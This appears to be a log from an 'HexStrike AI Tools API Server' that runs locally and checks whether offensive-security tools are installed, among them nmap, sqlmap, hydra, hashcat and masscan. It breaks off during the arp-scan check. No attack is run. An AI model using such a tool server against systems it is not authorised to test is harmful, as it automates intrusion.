2025-10-23 22:50:39,226 - __main__ - INFO - 🔧 Process pool worker 0 started
2025-10-23 22:50:39,226 - __main__ - INFO - 🔧 Process pool worker 1 started
2025-10-23 22:50:39,226 - __main__ - INFO - 🔧 Process pool worker 2 started
2025-10-23 22:50:39,227 - __main__ - INFO - 🔧 Process pool worker 3 started
2025-10-23 22:50:39,255 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-23 22:50:39,255 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Starting HexStrike AI Tools API Server[0m
2025-10-23 22:50:39,255 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-23 22:50:39,256 - __main__ - INFO - [1m│[0m [38;5;208m🌐 Port:[0m 8888
2025-10-23 22:50:39,256 - __main__ - INFO - [1m│[0m [38;5;208m🔧 Debug Mode:[0m False
2025-10-23 22:50:39,256 - __main__ - INFO - [1m│[0m [38;5;129m💾 Cache Size:[0m 1000 | TTL: 3600s
2025-10-23 22:50:39,256 - __main__ - INFO - [1m│[0m [38;5;240m⏱️  Command Timeout:[0m 300s
2025-10-23 22:50:39,256 - __main__ - INFO - [1m│[0m [38;5;46m✨ Enhanced Visual Engine:[0m Active
2025-10-23 22:50:39,256 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-23 22:50:39,267 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8888
 * Running on http://192.168.15.50:8888
2025-10-23 22:50:39,268 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-10-24 01:26:44,662 - __main__ - INFO - 🔧 Process pool worker 0 started
2025-10-24 01:26:44,663 - __main__ - INFO - 🔧 Process pool worker 1 started
2025-10-24 01:26:44,663 - __main__ - INFO - 🔧 Process pool worker 2 started
2025-10-24 01:26:44,664 - __main__ - INFO - 🔧 Process pool worker 3 started
2025-10-24 01:26:44,695 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,695 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Starting HexStrike AI Tools API Server[0m
2025-10-24 01:26:44,695 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,695 - __main__ - INFO - [1m│[0m [38;5;208m🌐 Port:[0m 8888
2025-10-24 01:26:44,695 - __main__ - INFO - [1m│[0m [38;5;208m🔧 Debug Mode:[0m False
2025-10-24 01:26:44,695 - __main__ - INFO - [1m│[0m [38;5;129m💾 Cache Size:[0m 1000 | TTL: 3600s
2025-10-24 01:26:44,695 - __main__ - INFO - [1m│[0m [38;5;240m⏱️  Command Timeout:[0m 300s
2025-10-24 01:26:44,695 - __main__ - INFO - [1m│[0m [38;5;46m✨ Enhanced Visual Engine:[0m Active
2025-10-24 01:26:44,695 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,702 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8888
 * Running on http://192.168.15.50:8888
2025-10-24 01:26:44,702 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-10-24 01:26:44,889 - __main__ - INFO - 🔍 Cache MISS for command: which nmap
2025-10-24 01:26:44,890 - __main__ - INFO - 🚀 EXECUTING: which nmap
2025-10-24 01:26:44,890 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,890 - __main__ - INFO - 🆔 PROCESS: PID 42942 started
2025-10-24 01:26:44,891 - __main__ - INFO - 🆔 REGISTERED: Process 42942 - which nmap...
2025-10-24 01:26:44,892 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42942
2025-10-24 01:26:44,895 - __main__ - INFO - 📤 STDOUT: /usr/bin/nmap
2025-10-24 01:26:44,897 - __main__ - INFO - 🧹 CLEANUP: Process 42942 removed from registry
2025-10-24 01:26:44,897 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,897 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,897 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,897 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,897 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nmap
2025-10-24 01:26:44,897 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,897 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 01:26:44,897 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,897 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,897 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,897 - __main__ - INFO - 💾 Cached result for command: which nmap
2025-10-24 01:26:44,897 - __main__ - INFO - 🔍 Cache MISS for command: which gobuster
2025-10-24 01:26:44,897 - __main__ - INFO - 🚀 EXECUTING: which gobuster
2025-10-24 01:26:44,897 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,898 - __main__ - INFO - 🆔 PROCESS: PID 42947 started
2025-10-24 01:26:44,898 - __main__ - INFO - 🆔 REGISTERED: Process 42947 - which gobuster...
2025-10-24 01:26:44,898 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42947
2025-10-24 01:26:44,900 - __main__ - INFO - 📤 STDOUT: /usr/bin/gobuster
2025-10-24 01:26:44,903 - __main__ - INFO - 🧹 CLEANUP: Process 42947 removed from registry
2025-10-24 01:26:44,903 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,903 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,903 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,903 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,903 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which gobuster
2025-10-24 01:26:44,903 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,903 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:44,903 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,903 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,903 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,903 - __main__ - INFO - 💾 Cached result for command: which gobuster
2025-10-24 01:26:44,903 - __main__ - INFO - 🔍 Cache MISS for command: which dirb
2025-10-24 01:26:44,903 - __main__ - INFO - 🚀 EXECUTING: which dirb
2025-10-24 01:26:44,903 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,903 - __main__ - INFO - 🆔 PROCESS: PID 42952 started
2025-10-24 01:26:44,904 - __main__ - INFO - 🆔 REGISTERED: Process 42952 - which dirb...
2025-10-24 01:26:44,904 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42952
2025-10-24 01:26:44,906 - __main__ - INFO - 📤 STDOUT: /usr/bin/dirb
2025-10-24 01:26:44,909 - __main__ - INFO - 🧹 CLEANUP: Process 42952 removed from registry
2025-10-24 01:26:44,909 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,909 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,909 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,909 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,909 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dirb
2025-10-24 01:26:44,909 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,909 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 01:26:44,909 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,909 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,909 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,909 - __main__ - INFO - 💾 Cached result for command: which dirb
2025-10-24 01:26:44,909 - __main__ - INFO - 🔍 Cache MISS for command: which nikto
2025-10-24 01:26:44,909 - __main__ - INFO - 🚀 EXECUTING: which nikto
2025-10-24 01:26:44,909 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,910 - __main__ - INFO - 🆔 PROCESS: PID 42957 started
2025-10-24 01:26:44,910 - __main__ - INFO - 🆔 REGISTERED: Process 42957 - which nikto...
2025-10-24 01:26:44,911 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42957
2025-10-24 01:26:44,912 - __main__ - INFO - 📤 STDOUT: /usr/bin/nikto
2025-10-24 01:26:44,913 - __main__ - INFO - 🧹 CLEANUP: Process 42957 removed from registry
2025-10-24 01:26:44,913 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:44,913 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,913 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,913 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,913 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nikto
2025-10-24 01:26:44,913 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:44,913 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 01:26:44,913 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,913 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,913 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,913 - __main__ - INFO - 💾 Cached result for command: which nikto
2025-10-24 01:26:44,913 - __main__ - INFO - 🔍 Cache MISS for command: which sqlmap
2025-10-24 01:26:44,913 - __main__ - INFO - 🚀 EXECUTING: which sqlmap
2025-10-24 01:26:44,913 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,914 - __main__ - INFO - 🆔 PROCESS: PID 42962 started
2025-10-24 01:26:44,914 - __main__ - INFO - 🆔 REGISTERED: Process 42962 - which sqlmap...
2025-10-24 01:26:44,914 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42962
2025-10-24 01:26:44,918 - __main__ - INFO - 📤 STDOUT: /usr/bin/sqlmap
2025-10-24 01:26:44,918 - __main__ - INFO - 🧹 CLEANUP: Process 42962 removed from registry
2025-10-24 01:26:44,918 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,918 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,918 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,918 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,918 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which sqlmap
2025-10-24 01:26:44,918 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,918 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:44,918 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,918 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,918 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,918 - __main__ - INFO - 💾 Cached result for command: which sqlmap
2025-10-24 01:26:44,918 - __main__ - INFO - 🔍 Cache MISS for command: which hydra
2025-10-24 01:26:44,918 - __main__ - INFO - 🚀 EXECUTING: which hydra
2025-10-24 01:26:44,918 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,919 - __main__ - INFO - 🆔 PROCESS: PID 42967 started
2025-10-24 01:26:44,919 - __main__ - INFO - 🆔 REGISTERED: Process 42967 - which hydra...
2025-10-24 01:26:44,919 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42967
2025-10-24 01:26:44,921 - __main__ - INFO - 📤 STDOUT: /usr/bin/hydra
2025-10-24 01:26:44,925 - __main__ - INFO - 🧹 CLEANUP: Process 42967 removed from registry
2025-10-24 01:26:44,925 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,925 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,925 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,925 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,925 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hydra
2025-10-24 01:26:44,925 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,925 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 01:26:44,925 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,925 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,925 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,925 - __main__ - INFO - 💾 Cached result for command: which hydra
2025-10-24 01:26:44,925 - __main__ - INFO - 🔍 Cache MISS for command: which john
2025-10-24 01:26:44,925 - __main__ - INFO - 🚀 EXECUTING: which john
2025-10-24 01:26:44,925 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,926 - __main__ - INFO - 🆔 PROCESS: PID 42972 started
2025-10-24 01:26:44,926 - __main__ - INFO - 🆔 REGISTERED: Process 42972 - which john...
2025-10-24 01:26:44,926 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42972
2025-10-24 01:26:44,929 - __main__ - INFO - 📤 STDOUT: /usr/sbin/john
2025-10-24 01:26:44,931 - __main__ - INFO - 🧹 CLEANUP: Process 42972 removed from registry
2025-10-24 01:26:44,931 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,931 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,931 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,931 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,931 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which john
2025-10-24 01:26:44,931 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,931 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 01:26:44,931 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,931 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,931 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,931 - __main__ - INFO - 💾 Cached result for command: which john
2025-10-24 01:26:44,931 - __main__ - INFO - 🔍 Cache MISS for command: which hashcat
2025-10-24 01:26:44,931 - __main__ - INFO - 🚀 EXECUTING: which hashcat
2025-10-24 01:26:44,931 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,931 - __main__ - INFO - 🆔 PROCESS: PID 42977 started
2025-10-24 01:26:44,931 - __main__ - INFO - 🆔 REGISTERED: Process 42977 - which hashcat...
2025-10-24 01:26:44,932 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42977
2025-10-24 01:26:44,934 - __main__ - INFO - 📤 STDOUT: /usr/bin/hashcat
2025-10-24 01:26:44,936 - __main__ - INFO - 🧹 CLEANUP: Process 42977 removed from registry
2025-10-24 01:26:44,936 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,937 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,937 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,937 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,937 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hashcat
2025-10-24 01:26:44,937 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,937 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:44,937 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,937 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,937 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,937 - __main__ - INFO - 💾 Cached result for command: which hashcat
2025-10-24 01:26:44,937 - __main__ - INFO - 🔍 Cache MISS for command: which rustscan
2025-10-24 01:26:44,937 - __main__ - INFO - 🚀 EXECUTING: which rustscan
2025-10-24 01:26:44,937 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,937 - __main__ - INFO - 🆔 PROCESS: PID 42982 started
2025-10-24 01:26:44,937 - __main__ - INFO - 🆔 REGISTERED: Process 42982 - which rustscan...
2025-10-24 01:26:44,938 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42982
2025-10-24 01:26:44,940 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/rustscan
2025-10-24 01:26:44,942 - __main__ - INFO - 🧹 CLEANUP: Process 42982 removed from registry
2025-10-24 01:26:44,942 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,942 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,942 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,942 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,942 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which rustscan
2025-10-24 01:26:44,942 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,942 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 24 bytes
2025-10-24 01:26:44,942 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,942 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,942 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,942 - __main__ - INFO - 💾 Cached result for command: which rustscan
2025-10-24 01:26:44,942 - __main__ - INFO - 🔍 Cache MISS for command: which masscan
2025-10-24 01:26:44,943 - __main__ - INFO - 🚀 EXECUTING: which masscan
2025-10-24 01:26:44,943 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,944 - __main__ - INFO - 🆔 PROCESS: PID 42987 started
2025-10-24 01:26:44,944 - __main__ - INFO - 🆔 REGISTERED: Process 42987 - which masscan...
2025-10-24 01:26:44,945 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42987
2025-10-24 01:26:44,946 - __main__ - INFO - 📤 STDOUT: /usr/bin/masscan
2025-10-24 01:26:44,949 - __main__ - INFO - 🧹 CLEANUP: Process 42987 removed from registry
2025-10-24 01:26:44,949 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,949 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,949 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,949 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,949 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which masscan
2025-10-24 01:26:44,949 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,949 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:44,949 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,949 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,949 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,949 - __main__ - INFO - 💾 Cached result for command: which masscan
2025-10-24 01:26:44,949 - __main__ - INFO - 🔍 Cache MISS for command: which autorecon
2025-10-24 01:26:44,949 - __main__ - INFO - 🚀 EXECUTING: which autorecon
2025-10-24 01:26:44,949 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,950 - __main__ - INFO - 🆔 PROCESS: PID 42992 started
2025-10-24 01:26:44,950 - __main__ - INFO - 🆔 REGISTERED: Process 42992 - which autorecon...
2025-10-24 01:26:44,950 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 42992
2025-10-24 01:26:44,953 - __main__ - INFO - 📤 STDOUT: /usr/bin/autorecon
2025-10-24 01:26:44,955 - __main__ - INFO - 🧹 CLEANUP: Process 42992 removed from registry
2025-10-24 01:26:44,955 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:44,955 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,955 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,955 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,955 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which autorecon
2025-10-24 01:26:44,955 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:44,955 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:44,955 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,955 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,955 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,955 - __main__ - INFO - 💾 Cached result for command: which autorecon
2025-10-24 01:26:44,955 - __main__ - INFO - 🔍 Cache MISS for command: which nbtscan
2025-10-24 01:26:44,955 - __main__ - INFO - 🚀 EXECUTING: which nbtscan
2025-10-24 01:26:44,955 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,956 - __main__ - INFO - 🆔 PROCESS: PID 42997 started
2025-10-24 01:26:44,956 - __main__ - INFO - 🆔 REGISTERED: Process 42997 - which nbtscan...
2025-10-24 01:26:44,958 - __main__ - INFO - 📤 STDOUT: /usr/bin/nbtscan
2025-10-24 01:26:44,960 - __main__ - INFO - 🧹 CLEANUP: Process 42997 removed from registry
2025-10-24 01:26:44,960 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:44,960 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:44,960 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:44,960 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:44,960 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nbtscan
2025-10-24 01:26:44,960 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:44,960 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:44,960 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:44,960 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:44,960 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:44,961 - __main__ - INFO - 💾 Cached result for command: which nbtscan
2025-10-24 01:26:44,961 - __main__ - INFO - 🔍 Cache MISS for command: which arp-scan
2025-10-24 01:26:44,961 - __main__ - INFO - 🚀 EXECUTING: which arp-scan
2025-10-24 01:26:44,961 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:44,962 - __main__ - INFO - 🆔 PROCESS: PID 43002 started
2025-10-24 01:26:44,962 - __main__ - INFO - 🆔 REGISTERED: Process 43002 - which arp-scan...
2025-10-24 01:26:44,962 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43002
